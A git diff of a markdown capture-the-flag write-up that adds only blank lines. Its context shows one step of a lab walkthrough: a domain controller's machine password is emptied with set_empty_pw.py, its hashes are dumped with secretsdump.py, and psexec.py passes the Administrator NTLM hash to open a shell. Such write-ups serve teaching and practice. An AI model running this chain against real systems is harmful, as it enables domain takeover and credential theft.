@@ -85,6 +85,7 @@ The command gonna look like this:
     python3 set_empty_pw.py <DC-NAME> <target_ip>
    
 ![enter image description here](https://i.ibb.co/yYWR0RL/Screen-Shot-2022-12-29-at-1-31-40-PM.png)
+
 That was successful now we gonna dump the hashes with ```secretsdump.py```
 
     secretsdump.py -just-dc <DC-NAME>\$@<target_ip>
@@ -92,11 +93,13 @@ That was successful now we gonna dump the hashes with ```secretsdump.py```
 We can grep the Administrator hash directly:
 
 ![enter image description here](https://i.ibb.co/VNn9Y6k/Screen-Shot-2022-12-29-at-1-41-33-PM.png)
+
 And there it is, now we can log as Administrator using the NTLM hash with ```psexec.py```:
 
     psexec.py -hashes <NTLM_Hash> <user>@<target_ip> cmd.exe
 
 ![enter image description here](https://i.ibb.co/ynLYSPT/Screen-Shot-2022-12-29-at-1-45-14-PM.png)
+
 Here we go, you can search for the flag.
 
 ### Machine 4
